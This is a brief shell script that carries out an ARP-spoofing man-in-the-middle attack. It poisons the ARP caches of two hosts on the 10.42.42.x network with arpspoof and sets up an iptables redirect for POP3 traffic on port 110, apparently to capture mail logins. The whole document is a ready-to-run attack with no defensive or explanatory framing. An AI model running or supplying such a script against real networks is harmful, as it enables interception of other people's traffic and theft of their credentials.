echo "flushing iptables"
iptables -t nat -F
iptables -F
echo "setting up redirect rule"
iptables -t nat -A PREROUTING -p tcp --dport 110 -j REDIRECT --to-port 110
echo "arp spoofing"
arpspoof -i eth0 -t 10.42.42.10 10.42.42.2 &
arpspoof -i eth0 -t 10.42.42.2 10.42.42.10
killall arpspoof
echo "flushing iptables"
iptables -t nat -F
iptables -F
